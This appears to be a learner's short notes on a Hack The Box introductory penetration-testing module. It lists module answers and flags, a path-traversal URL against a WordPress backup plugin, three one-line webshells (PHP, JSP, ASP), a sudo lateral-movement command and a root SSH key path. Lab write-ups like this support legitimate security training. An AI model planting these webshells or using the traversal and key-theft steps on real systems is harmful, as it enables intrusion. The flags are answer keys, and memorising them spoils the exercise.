# Getting started

## Basic Tools
Done. IM NOT USING VIM. PERIOD!
A: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1

## Service Scanning
A1: Apache tomcat
A2: 2323
A3: flag.txt:dceece590f3284c3866305eb2473d099

## Web-enumeration:
admin:password123 found in page disallowed in robots.txt. 
--> /admin-login-page.php

A1: HTB{w3b_3num3r4710n_r3v34l5_53cr375}

## Public Exploits

Simple Backup Wordpress 2.7.11
http://178.128.167.10:31785/wp-admin/tools.php?page=backup_manager&download_backup_file=../../../../../flag.txt

A1: HTB{my_f1r57_h4ck}

## Types of Shells
webshells:
<?php system($_REQUEST["cmd"]); ?>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<% eval request("cmd") %>

## Privilege Escalation
(user2 : user2) NOPASSWD: /bin/bash

A1: HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r} 
sudo -u user2 /bin/bash

A2: HTB{pr1v1l363_35c4l4710n_2_r007}
/root/.ssh/id_rsa